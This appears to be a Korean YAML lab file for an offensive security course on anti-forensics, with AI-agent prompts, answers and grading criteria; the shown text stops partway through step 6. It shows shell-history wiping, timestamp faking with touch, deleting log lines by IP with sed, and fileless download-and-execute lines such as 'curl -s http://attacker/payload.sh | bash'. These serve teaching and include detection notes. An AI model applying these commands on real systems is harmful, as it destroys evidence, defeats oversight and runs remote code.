lab_id: attack-adv-ai-week11
title: 안티포렌식 기법 (AI 지원)
version: ai
course: attack-adv-ai
week: 11
description: 디지털 포렌식 수사를 방해하는 안티포렌식 기법을 실습한다. 로그 삭제, 타임스탬프 조작, 파일리스 공격, 암호화 등 흔적 은닉
  기법을 다룬다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- 디지털 포렌식의 증거 수집 과정과 도구를 이해한다
- 타임스탬프 조작, 로그 삭제 등 안티포렌식 기법을 적용한다
- 파일리스 공격과 메모리 전용 실행 기법을 실습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 현재 시스템의 포렌식 아티팩트를 확인하라. bash_history, wtmp, lastlog, syslog 등의 위치와
    내용을 확인하라.
  hint: 포렌식에서 중요한 로그 파일의 위치와 형식을 파악한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: 현재 시스템의 포렌식 아티팩트를 확인하라. bash_history, wtmp, lastlog, syslog 등의
    위치와 내용을 확인해줘

    📎 참고 (CLI): echo ''=== Forensic Artifacts ==='' && echo ''[Bash History]'' &&
    wc -l ~/.bash_history 2>/dev/null && echo ''[Login Records]'' && last -5 2>/dev/null
    && echo ''[Auth Log]'' && tail -3 /var/log/auth.log 2>/dev/null && echo ''[Syslog]''
    && tail -3 /var/log/syslog 2>/dev/null && echo ''[File Timestamps]'' && stat ~/.bashrc
    | grep -E ''(Access|Modify|Change)'''
  answer_detail: 디지털 포렌식의 주요 아티팩트는 로그 파일(syslog, auth.log), 로그인 기록(wtmp, lastlog),
    셸 히스토리(.bash_history), 파일 타임스탬프(MAC times)이다. 이들은 공격자의 활동을 재구성하는 데 사용된다. 안티포렌식은
    이러한 아티팩트를 조작하거나 제거한다.
  verify:
    type: output_contains
    expect: Forensic Artifacts
    field: stdout
    semantic:
      intent: 포렌식 아티팩트 인벤토리 — bash_history/wtmp/auth.log/syslog/파일 MAC times 위치와 내용을
        확인 (안티포렌식 전 기초)
      success_criteria:
      - bash_history, last/wtmp, auth.log, syslog 중 3개 이상의 아티팩트 확인
      - 각 아티팩트의 대표 정보 출력 (wc/tail/last 결과)
      - 파일 MAC(Modify/Access/Change) 타임스탬프 stat 출력 포함
      acceptable_methods:
      - wc -l + last + tail + stat 조합 명령
      - find /var/log -type f -mtime -1
      - journalctl --no-pager | head
      - auditctl -l 로 감사 룰 확인
      negative_signs:
      - 단일 아티팩트만 조회
      - 파일 경로 없이 개념만 설명
      - 출력 검증 없이 명령 나열만
  target_vm: attacker
  script: echo '=== Forensic Artifacts ===' && echo '[Bash History]' && wc -l ~/.bash_history
    2>/dev/null && echo '[Login Records]' && last -5 2>/dev/null && echo '[Auth Log]'
    && tail -3 /var/log/auth.log 2>/dev/null && echo '[Syslog]' && tail -3 /var/log/syslog
    2>/dev/null && echo '[File Timestamps]' && stat ~/.bashrc | grep -E '(Access|Modify|Change)'
  risk_level: low
  bastion_prompt: 현재 시스템의 포렌식 아티팩트를 확인하라. bash_history, wtmp, lastlog, syslog 등의 위치와
    내용을 확인해줘
- order: 2
  instruction: 셸 히스토리를 조작하라. 현재 세션의 명령 기록을 비활성화하고, 특정 명령을 히스토리에서 제거하는 방법을 보여라.
  hint: HISTFILE, HISTSIZE, history -d 등을 사용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 셸 히스토리를 조작해줘

    📎 참고 (CLI): echo ''=== History Manipulation ==='' && echo ''Current HISTFILE:''
    $HISTFILE && echo ''Current HISTSIZE:'' $HISTSIZE && echo '''' && echo ''Disable
    history for session:'' && echo ''unset HISTFILE'' && echo ''export HISTSIZE=0''
    && echo ''set +o history'' && echo '''' && echo ''Delete specific entry:'' &&
    echo ''history -d <line_number>'' && echo '''' && echo ''Clear all history:''
    && echo ''history -c && history -w'' && echo '''' && echo ''Prevent future logging:''
    && echo ''ln -sf /dev/null ~/.bash_history'''
  answer_detail: 셸 히스토리 조작은 가장 기본적인 안티포렌식이다. HISTFILE을 /dev/null로 심볼릭 링크하면 이후 명령이
    기록되지 않는다. HISTCONTROL=ignorespace를 설정하면 공백으로 시작하는 명령이 기록되지 않는다. 하지만 auditd가 설정되어
    있으면 execve 시스템 콜 수준에서 모든 명령이 기록된다.
  verify:
    type: output_contains
    expect: History Manipulation
    field: stdout
    semantic:
      intent: 셸 히스토리 조작 기법 — HISTFILE unset/HISTSIZE 0/history -d/ln -sf /dev/null
        ~/.bash_history 로 기록 은닉
      success_criteria:
      - HISTFILE 또는 HISTSIZE 현재 값 확인
      - 기록 비활성화 방법 최소 2가지(unset HISTFILE, set +o history 등) 제시
      - auditd 설정 시 한계(execve 레벨 기록) 언급
      acceptable_methods:
      - echo $HISTFILE + echo $HISTSIZE
      - history -c && history -w
      - ln -sf /dev/null ~/.bash_history
      - HISTCONTROL=ignorespace 설정
      negative_signs:
      - unset 또는 history 명령 1개만 제시
      - auditd/기록 복제 가능성 언급 없음
      - 셸 종류 구분 없이 추상적 설명
  target_vm: attacker
  script: echo '=== History Manipulation ===' && echo 'Current HISTFILE:' $HISTFILE
    && echo 'Current HISTSIZE:' $HISTSIZE && echo '' && echo 'Disable history for
    session:' && echo 'unset HISTFILE' && echo 'export HISTSIZE=0' && echo 'set +o
    history' && echo '' && echo 'Delete specific entry:' && echo 'history -d <line_number>'
    && echo '' && echo 'Clear all history:' && echo 'history -c && history -w' &&
    echo '' && echo 'Prevent future logging:' && echo 'ln -sf /dev/null ~/.bash_history'
  risk_level: medium
  bastion_prompt: '셸 히스토리를 조작해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: 파일의 타임스탬프(MAC times)를 조작하라. touch 명령으로 특정 파일의 접근/수정 시간을 과거로 변경하라.
  hint: touch -t YYYYMMDDhhmm 파일 또는 touch -r 참조파일 대상파일로 타임스탬프를 변경한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 파일의 타임스탬프(MAC times)를 조작하라. touch 명령으로 특정 파일의 접근/수정 시간을 과거로 변경해줘

    📎 참고 (CLI): echo ''test'' > /tmp/antiforensic_test.txt && echo ''Before:'' &&
    stat /tmp/antiforensic_test.txt | grep -E ''(Access|Modify|Change)'' && touch
    -t 202301010000 /tmp/antiforensic_test.txt && echo ''After timestamp manipulation:''
    && stat /tmp/antiforensic_test.txt | grep -E ''(Access|Modify|Change)'' && echo
    '''' && echo ''Note: Change time (ctime) cannot be set by touch'' && echo ''Forensic
    detection: ctime newer than mtime indicates tampering'''
  answer_detail: MAC 타임스탬프(Modify/Access/Change)는 파일 활동의 타임라인을 재구성하는 핵심 아티팩트이다. touch로
    atime과 mtime을 변경할 수 있지만, ctime(inode 변경 시간)은 일반적인 방법으로 변경할 수 없다. ctime이 mtime보다
    새로우면 타임스탬프 조작의 증거가 된다.
  verify:
    type: output_contains
    expect: timestamp manipulation
    field: stdout
    semantic:
      intent: 파일 MAC 타임스탬프 조작 — touch -t 또는 -r 로 atime·mtime 변경 후 ctime 과의 비교로 조작
        탐지 원리 이해
      success_criteria:
      - 테스트 파일 생성 후 stat 으로 초기 타임스탬프 출력
      - touch -t YYYYMMDDhhmm 로 atime·mtime 조작 후 재확인
      - ctime 이 mtime 보다 새로우면 조작 탐지된다는 설명
      acceptable_methods:
      - touch -t 202301010000 <file>
      - touch -r <reference> <target>
      - debugfs 또는 ext4 inode 조작으로 ctime 변경 (고급)
      - Windows SetFileTime API 대응 개념 언급
      negative_signs:
      - touch 없이 파일 내용만 수정
      - stat 출력 비교 단계 생략
      - ctime 조작 한계 설명 없음
  target_vm: attacker
  script: 'echo ''test'' > /tmp/antiforensic_test.txt && echo ''Before:'' && stat
    /tmp/antiforensic_test.txt | grep -E ''(Access|Modify|Change)'' && touch -t 202301010000
    /tmp/antiforensic_test.txt && echo ''After timestamp manipulation:'' && stat /tmp/antiforensic_test.txt
    | grep -E ''(Access|Modify|Change)'' && echo '''' && echo ''Note: Change time
    (ctime) cannot be set by touch'' && echo ''Forensic detection: ctime newer than
    mtime indicates tampering'''
  risk_level: medium
  bastion_prompt: '파일의 타임스탬프(MAC times)를 조작하라. touch 명령으로 특정 파일의 접근/수정 시간을 과거로 변경해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: 로그 파일에서 특정 항목을 선택적으로 제거하라. sed를 사용하여 특정 IP나 키워드가 포함된 로그 라인을 삭제하는 기법을
    보여라.
  hint: sed -i '/패턴/d' 로그파일로 특정 라인을 삭제한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 로그 파일에서 특정 항목을 선택적으로 제거하라. sed를 사용하여 특정 IP나 키워드가 포함된 로그 라인을 삭제하는
    기법을 보여라해줘

    📎 참고 (CLI): cp /var/log/syslog /tmp/syslog_copy 2>/dev/null || echo ''test log
    line with 10.20.30.201'' > /tmp/syslog_copy && echo ''test normal log line'' >>
    /tmp/syslog_copy && echo ''Before:'' && wc -l /tmp/syslog_copy && echo '''' &&
    sed -i ''/10.20.30.201/d'' /tmp/syslog_copy && echo ''After removing attacker
    IP lines:'' && wc -l /tmp/syslog_copy && echo '''' && echo ''=== Log Tampering
    Techniques ==='' && echo ''1. sed -i "/pattern/d" logfile - Remove matching lines''
    && echo ''2. > logfile - Truncate file (preserves inode)'' && echo ''3. shred
    -u logfile - Secure delete'' && echo ''4. logrotate manipulation - Force early
    rotation'''
  answer_detail: 선택적 로그 삭제는 공격 흔적만 제거하면서 로그의 전체 무결성을 유지하려는 기법이다. 하지만 로그 갭(gap)이 발생하거나,
    원격 로그 서버(rsyslog)에 사본이 있으면 탐지된다. 방어를 위해 로그를 원격 서버에 실시간 전송하고, 쓰기 전용(append-only)
    스토리지를 사용해야 한다.
  verify:
    type: output_contains
    expect:
    - Log Tampering
    - sed
    field: stdout
    semantic:
      intent: 선택적 로그 라인 삭제 — sed -i /pattern/d 로 특정 IP/키워드 라인 제거 + 원격 로그 서버가 있을 때
        한계
      success_criteria:
      - 테스트 syslog 사본 생성 후 특정 IP 라인 sed -i 로 제거
      - Before/After 라인 수 비교
      - Log Tampering 기법 목록(sed/truncate/shred/logrotate) 4개 이상 제시
      acceptable_methods:
      - cp + sed -i /pattern/d
      - awk !/pattern/ >> newlog
      - grep -v pattern file > filtered
      - python 으로 라인 필터링
      negative_signs:
      - 전체 파일 truncate 만 언급
      - 원격 syslog 서버/append-only 방어 설명 없음
      - 실제 조작 없이 개념만
  target_vm: attacker
  script: cp /var/log/syslog /tmp/syslog_copy 2>/dev/null || echo 'test log line with
    10.20.30.201' > /tmp/syslog_copy && echo 'test normal log line' >> /tmp/syslog_copy
    && echo 'Before:' && wc -l /tmp/syslog_copy && echo '' && sed -i '/10.20.30.201/d'
    /tmp/syslog_copy && echo 'After removing attacker IP lines:' && wc -l /tmp/syslog_copy
    && echo '' && echo '=== Log Tampering Techniques ===' && echo '1. sed -i "/pattern/d"
    logfile - Remove matching lines' && echo '2. > logfile - Truncate file (preserves
    inode)' && echo '3. shred -u logfile - Secure delete' && echo '4. logrotate manipulation
    - Force early rotation'
  risk_level: medium
  bastion_prompt: '로그 파일에서 특정 항목을 선택적으로 제거하라. sed를 사용하여 특정 IP나 키워드가 포함된 로그 라인을 삭제하는
    기법을 보여라해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: 파일리스(Fileless) 공격을 시뮬레이션하라. 메모리에서만 실행되는 코드를 구성하여 디스크에 흔적을 남기지 않는 기법을
    보여라.
  hint: curl | bash, python -c, /dev/shm 등을 활용한 메모리 전용 실행을 시뮬레이션한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 파일리스(Fileless) 공격을 시뮬레이션해줘

    📎 참고 (CLI): echo ''=== Fileless Attack Techniques ==='' && echo '''' && echo ''[1]
    Download and Execute in Memory'' && echo ''curl -s http://attacker/payload.sh
    | bash'' && echo ''wget -qO- http://attacker/payload.py | python3'' && echo ''''
    && echo ''[2] Memory-only execution'' && echo ''python3 -c "import os; os.system(\"id\")"''
    && echo '''' && echo ''[3] tmpfs/ramfs (no disk touch)'' && ls -la /dev/shm/ |
    head -5 && echo ''Files in /dev/shm are in RAM only'' && echo '''' && echo ''[4]
    Process injection'' && echo ''/proc/<pid>/mem write (ptrace)'' && echo '''' &&
    echo ''[5] Living off the Land (LOLBins)'' && echo ''Uses legitimate system tools:
    curl, python, perl, awk'''
  answer_detail: 파일리스 공격은 디스크에 악성 파일을 생성하지 않아 파일 기반 AV와 포렌식을 회피한다. 파이프라인 실행(curl|bash),
    인터프리터 인라인 실행(python -c), tmpfs 활용, LOLBins(Living off the Land Binaries)가 대표적이다.
    탐지를 위해서는 메모리 분석, 프로세스 모니터링, 행위 기반 탐지가 필요하다.
  verify:
    type: output_contains
    expect: Fileless Attack
    field: stdout
    semantic:
      intent: 파일리스(Fileless) 실행 기법 — curl|bash·python -c·/dev/shm·LOLBins·process
        injection 등 디스크 무흔적 실행 방법
      success_criteria:
      - 파일리스 기법 최소 3개(download+execute, 인터프리터 인라인, tmpfs 등) 열거
      - /dev/shm 또는 tmpfs 활용 언급
      - LOLBins (curl/python/perl/awk) 개념 언급
      acceptable_methods:
      - echo 로 기법 나열 + /dev/shm 목록 확인
      - python3 -c <inline code> 예시
      - bash <(curl -s <url>) 프로세스 대체
      - memfd_create + fexecve 로 고급 기법
      negative_signs:
      - 파일 생성/실행 기반 기법만 소개
      - 메모리 분석·행위 탐지 대응 언급 없음
      - LOLBins 개념 누락
  target_vm: attacker
  script: 'echo ''=== Fileless Attack Techniques ==='' && echo '''' && echo ''[1]
    Download and Execute in Memory'' && echo ''curl -s http://attacker/payload.sh
    | bash'' && echo ''wget -qO- http://attacker/payload.py | python3'' && echo ''''
    && echo ''[2] Memory-only execution'' && echo ''python3 -c "import os; os.system(\"id\")"''
    && echo '''' && echo ''[3] tmpfs/ramfs (no disk touch)'' && ls -la /dev/shm/ |
    head -5 && echo ''Files in /dev/shm are in RAM only'' && echo '''' && echo ''[4]
    Process injection'' && echo ''/proc/<pid>/mem write (ptrace)'' && echo '''' &&
    echo ''[5] Living off the Land (LOLBins)'' && echo ''Uses legitimate system tools:
    curl, python, perl, awk'''
  risk_level: medium
  bastion_prompt: '파일리스(Fileless) 공격을 시뮬레이션해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: 파일 삭제 후 복구 방지를 위한 안전 삭제(Secure Delete) 기법을 실습하라. shred, dd, wipe 등의
    도구를 비교하라.
  hint: shred -vfz -n 3으로 다회 덮어쓰기를 수행한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 파일 삭제 후 복구 방지를 위한 안전 삭제(Secure Delete) 기법을 실습하라. shred, dd, wipe
    등의 도구를 비교해줘

